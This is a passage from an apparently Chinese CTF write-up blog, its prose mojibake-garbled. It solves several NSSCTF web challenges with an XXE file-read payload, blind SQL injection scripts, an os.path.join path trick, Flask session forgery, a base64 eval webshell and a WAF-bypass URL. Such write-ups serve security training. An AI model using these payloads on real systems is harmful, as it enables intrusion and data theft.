class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿›è¡Œå¸¸è§„çš„ä»£ç å®¡è®¡ï¼Œå‘ç°ä¸Šä¼ çš„æ–‡ä»¶åä¸èƒ½æœ‰ç‚¹ï¼Œé‚£ä¹ˆä¸Šä¼ æœ¨é©¬å•¥çš„å°±ä¸å­˜åœ¨äº†ï¼Œå› ä¸ºè§£æä¸äº†ï¼ŒæŒºå®‰å…¨çš„ï¼Œä½†æˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ï¼Œä¸Šä¼ æ–‡ä»¶åä¼šè·å¾—ä¸€ä¸ªuuidå¹¶å°†uuidå’Œfilenameä¸€èµ·å­˜å…¥æ•°æ®åº“ï¼Œåœ¨fileç›®å½•ä¸‹å¯ä»¥æŸ¥è¯¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåœ¨fileå‡½æ•°ä¸­æœ‰ä¸€ä¸ªé‡è¦çš„åˆ©ç”¨ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.path.join</span><br></pre></td></tr></table></figure><p>æ‰“å¼€uploadsç›®å½•ä¸‹çš„æ–‡ä»¶å¹¶è¯»å–å†…å®¹ï¼Œç„¶åreturnã€‚æ­¤å¤„å­˜åœ¨ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´ï¼ï¼ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚</span><br><span class="line"></span><br><span class="line">ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ / å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šä¼ &#x2F;flagï¼Œé‚£ä¹ˆuploadså°†è¢«åˆ é™¤ï¼Œç›´æ¥è¯»å–&#x2F;flagä¸‹çš„å†…å®¹ï¼Œé‚£å°±æ‹¿æäº†ï¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202091606567.png" alt="image-20241202091606567"></p><p>ç„¶åè®¿é—®fileä¸‹å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;0aff3bd4-26ba-4b76-bf5c-36bf2eb5e175&#125;</span><br></pre></td></tr></table></figure><h2 id="CSAWQual-2019-Unagi"><a href="#CSAWQual-2019-Unagi" class="headerlink" title="[CSAWQual 2019]Unagi"></a>[CSAWQual 2019]Unagi</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093801748.png" alt="image-20241202093801748" style="zoom: 80%;" /><p>ç‚¹å‡»hereåæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093817078.png" alt="image-20241202093817078" style="zoom:67%;" /><p>åŒæ—¶é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬flagåœ¨&#x2F;flagï¼Œé‚£ä¹ˆxxeæ‹¿æäº†ã€‚</p><p>ä¸Šä¼ xmlå³å¯ï¼Œä½†æ˜¯ä¸Šä¼ åå‘ç°å­˜åœ¨waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;users&gt; </span><br><span class="line">  &lt;user&gt;</span><br><span class="line">   &lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">   &lt;password&gt;&amp;xxe;&lt;/password&gt;</span><br><span class="line">   &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">   &lt;email&gt;&amp;xxe;&lt;/email&gt;</span><br><span class="line">   &lt;group&gt;&amp;xxe;&lt;/group&gt;</span><br><span class="line">   &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">  &lt;/user&gt;</span><br><span class="line">&lt;/users&gt; </span><br></pre></td></tr></table></figure><p>é‚£å°±ç¼–ç è½¬æ¢ä¸€ä¸‹ï¼Œç®€å•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f UTF-8 -t UTF-16BE 1.xml &gt; 2.xml</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093953244.png" alt="image-20241202093953244" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4784f04-d534-46f9-adee-431ea58cb80a&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019ååŒ—Day2-Web1"><a href="#CISCN-2019ååŒ—Day2-Web1" class="headerlink" title="[CISCN 2019ååŒ—Day2]Web1"></a>[CISCN 2019ååŒ—Day2]Web1</h2><p>å¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œå°±ç®€å•åœ°è´´ä¸¤ä¸ªè„šæœ¬å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">min</span>&lt;<span class="built_in">max</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        <span class="comment"># payload = &quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url= url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buuctf web Hack World</span></span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> right</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28299/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        mid = (letf + right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="CISCN-2019åä¸œå—-Web11"><a href="#CISCN-2019åä¸œå—-Web11" class="headerlink" title="[CISCN 2019åä¸œå—]Web11"></a>[CISCN 2019åä¸œå—]Web11</h2><p><strong>è€ƒç‚¹smarty ssti</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113409968.png" alt="image-20241202113409968"></p><p>Smartyæ¨¡æ¿ï¼Œä¸å‡ºæ„å¤–åº”è¯¥å°±æ˜¯ssti</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113436817.png" alt="image-20241202113436817"></p><p>sstiç¡®å®šäº†</p><blockquote><p>åœ¨è¿™é‡Œæœ‰ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><ol><li>Smartyæ”¯æŒä½¿ç”¨{php}{&#x2F;php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤</li><li>XFFå¤´ä»£è¡¨äº†HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œé€šè¿‡ä¿®æ”¹XXFå¤´å¯ä»¥å®ç°ä¼ªé€ IP</li></ol></blockquote><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113745659.png" alt="image-20241202113745659"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113809806.png" alt="image-20241202113809806"></p><h2 id="FSCTF-2023-æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼"><a href="#FSCTF-2023-æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼" class="headerlink" title="[FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼"></a>[FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼</h2><p>è€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ ï¼Œå¯¹åç¼€ï¼Œå†…å®¹é•¿åº¦ï¼Œæ–‡ä»¶å¤´ï¼Œå†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202120310235.png" alt="image-20241202120310235"></p><blockquote><p>BMä¸GIF89aä¸€æ ·å¯ä»¥ä½œä¸ºæ–‡ä»¶å¤´ï¼Œbmæ˜¯bmpçš„</p><p>çŸ­æ ‡ç­¾ä¸ç”¨é—­åˆï¼ï¼ï¼</p></blockquote><h2 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h2><p>æœ¬è´¨ä¸Šæ˜¯ä¸€é“éå¸¸ç®€å•çš„sessionä¼ªé€ é¢˜</p><p>ä½†æ˜¯åœ¨ä½¿ç”¨è„šæœ¬æ—¶å‡ºç°äº†ä¸€äº›é—®é¢˜å¯¼è‡´ä¸€ç›´æŠ¥é”™ï¼Œè¿™é‡Œé˜è¿°ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;th3f1askisfunny&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True,&#x27;_i</span><br><span class="line">d&#x27;: &#x27;323e553274b92d78b97cec1e6057e2d1e427da85e1e1d30ab94c690b84cea27289a62d7bfece7c28411e7440095785ba82b839cb6355dad9068</span><br><span class="line">bdd3f73b6aac8&#x27;,&#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„Trueä¸èƒ½ä¸ºtrueï¼ŒåŒæ—¶è¦æ³¨æ„ä¸€äº›ç©ºæ ¼ï¼Œå€¼å‰è¦æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202135053653.png" alt="image-20241202135053653"></p><p>é”™è¯¯ç¤ºä¾‹å¦‚ä¸Š</p><h2 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node4.anna.nssctf.cn:28768?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure><p>æä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å°±å¥½ï¼Œæ”¾å“¥æ–¯æ‹‰ä¸Šé¢</p><p>å‘ç°æ‰§è¡Œä¸äº†å‘½ä»¤ï¼Œå­˜åœ¨disable_functionï¼Œå¯ä»¥ç”¨æ’ä»¶æ¥ç»•è¿‡</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202141718720.png" alt="image-20241202141718720"></p><h2 id="NCTF-2018-Easy-Audit"><a href="#NCTF-2018-Easy-Audit" class="headerlink" title="[NCTF 2018]Easy_Audit"></a>[NCTF 2018]Easy_Audit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/yulige|flag|nctf/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//æ—¥çˆ†md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œé¦–å…ˆå¯¹é¢˜ç›®è¿›è¡Œæ€è·¯è§£æï¼š</p><p>è¦ä»¥GETæ–¹æ³•æ¥æ”¶yuligeå‚æ•°ï¼Œä½†æ˜¯ä¼šè¢«è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);</span><br></pre></td></tr></table></figure><p>$_SERVER[â€˜QUERY_STRINGâ€™]åŒ¹é…çš„æ˜¯é—®å·åçš„å†…å®¹ï¼Œä¸”ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡urlç¼–ç ç»•è¿‡</p><p>ä½†æ˜¯ä¸Šé¢åˆå­˜åœ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_REQUEST)&#123;</span><br><span class="line">    foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¼šåŒ¹é…ä½¿å¯¹yuligeçš„ä¼ å‚ä¸èƒ½æœ‰å­—æ¯ï¼Œè¿™å¯ä¸è¡Œå•Šï¼ï¼</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°è¿™åªæ˜¯$_REQUESTï¼Œå¦‚æœåŒæ—¶getå’Œpostï¼Œpostä¼˜å…ˆï¼Œä¼šäº§ç”Ÿå˜é‡è¦†ç›–ã€‚</p><p>ç„¶åæˆ‘ä»¬éœ€è¦å…³æ³¨çš„å°±æ˜¯è¿™é‡Œçš„å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//æ—¥çˆ†md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¦ç»•è¿‡md5çš„æ¯”è¾ƒï¼Œè¦è®©è‡ªå·±çš„å‰32ä½å¼ºç­‰äºè‡ªå·±çš„md5å€¼ï¼Œé‡‡ç”¨æ•°ç»„ç»•è¿‡ã€‚å› ä¸ºéƒ½ä¸ºNULL</p><p>ç„¶ååé¢çš„å°±å¤ªç®€å•äº†ï¼Œç»™å‡ºpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28809/?%79%75%6C%69%67%65[]=123&amp;%6E%63%74%66=nnct%66isfun&amp;%66%6C%61%67=data://text/plain,ccc_liubi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yulige=123&amp;nctf=1&amp;flag=2</span><br></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">// Welcome to NSSCTF Round#1 Basic, have fun. 